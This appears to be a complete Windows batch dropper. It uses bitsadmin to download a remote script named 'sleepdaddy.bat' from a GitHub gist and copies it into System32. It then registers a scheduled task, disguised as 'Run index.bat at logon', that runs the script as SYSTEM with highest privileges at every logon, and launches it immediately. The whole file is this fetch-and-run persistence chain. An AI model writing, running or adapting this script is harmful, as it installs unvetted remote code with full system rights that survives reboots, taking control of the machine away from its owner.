@echo off 

cd /d %windir%\system32
set url=https://gist.github.com/INeddHelp/71d5cef5935055810bf338f97c3e8605/raw/sleepdaddy.bat
set output_file=sleepdaddy.bat
set system32_dir=C:\Windows\System32
bitsadmin /transfer "DownloadFile" %url% "%cd%\%output_file%"
xcopy /y "%cd%\%output_file%" "%system32_dir%"
schtasks /create /tn "Run index.bat at logon" /tr "%windir%\System32\sleepdaddy.bat" /sc ONLOGON /rl highest /ru System /f
start sleepdaddy.bat